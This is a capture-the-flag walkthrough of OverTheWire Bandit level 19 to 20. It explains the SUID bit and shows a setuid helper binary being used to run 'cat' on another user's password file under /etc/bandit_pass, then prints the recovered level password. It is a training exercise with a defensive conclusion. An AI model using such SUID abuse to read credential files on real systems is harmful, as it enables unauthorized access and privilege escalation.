# OverTheWire-Bandit-WriteUp-Level-19---20
## Objectives:
Understand how special permissions work on Linux systems (specifically the SUID bit) and demonstrate how a misconfigured binary can be exploited to execute commands with elevated privileges and access restricted files.
The objective of this level is to find the password located in */etc/bandit* pass using the SUID.

# Instructions:
### Step 1:
First we look at the contents of the directory *~* using the command:
```
ls
```
And the result is this:
```
bandit20-do
```
### Step 2:
We try to execute the file using the command:
```
./bandit20-do
```
And the output is this:
```
Run a command as another user.
  Example: ./bandit20-do whoami
```
### Step 3:
Due to the above result, we check the permissions of the **bandit20-do** file using the command:
```
ls -la bandit20-do
```
The letter 's' in the owner section confirmed that this was a SUID binary belonging to the target user **_(bandit20)_**.
```
-rwsr-x--- 1 bandit20 bandit19 14884 Oct 14 09:26 bandit20-do
```
### Step 4:
With this information in mind, perform a cat on */etc/bandit_pass/bandit20* to see the level 20 password:
```
cat /etc/bandit_pass/bandit20
```
But we receive this output denying us access:
```
cat: /etc/bandit_pass/bandit20: Permission denied
```
### Step 5:

Knowing that our current user does not have the permissions to read the file, we use the SUID binary to bypass this restriction. We execute the cat command as an argument:
```
./bandit20-do cat /etc/bandit_pass/bandit20
```
And the output is this:
```
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
```
Level 20 password was found.

# Conclusions:
The binary successfully executed the command with **bandit20**'s permissions, bypassing system access controls and revealing the password in plain text on standard output. This demonstrates the criticality of assigning the SUID bit only to strictly necessary and safe programs.
